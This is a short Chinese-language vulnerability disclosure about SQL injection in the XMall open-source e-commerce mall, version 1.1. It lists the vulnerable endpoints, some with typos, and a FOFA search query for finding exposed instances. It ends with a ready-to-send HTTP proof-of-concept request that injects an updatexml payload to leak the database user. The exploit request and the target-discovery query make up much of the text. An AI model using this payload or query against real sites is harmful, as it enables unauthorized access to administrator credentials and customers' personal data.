一、产品简介
XMal 开源电商商城 是开发者Exrick的一款基于SOA架构Q的分布式电商购物商城 前后端分离 前台商城:Vue全家桶 后台管理:Dubbo/SSM/Elasticsearch/Redis/MySQL/ActiveMQ/Shiro/Zookeeper等。
二、漏洞概述
XMal 开源商城 itemlist./itemvistSearch,/svslog,lorderlist,/memmberlist、/meberlistremove等多处接口存在SQL注入漏洞，未经身份验证的攻击者可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

三、影响范围
XMall = 1.1

四、复现环境
fofa:app=“XMall-后台管理系统”

POC
GET /item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136 HTTP/1.1
Host: your-ip
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,or;q=0.7
Connection: close
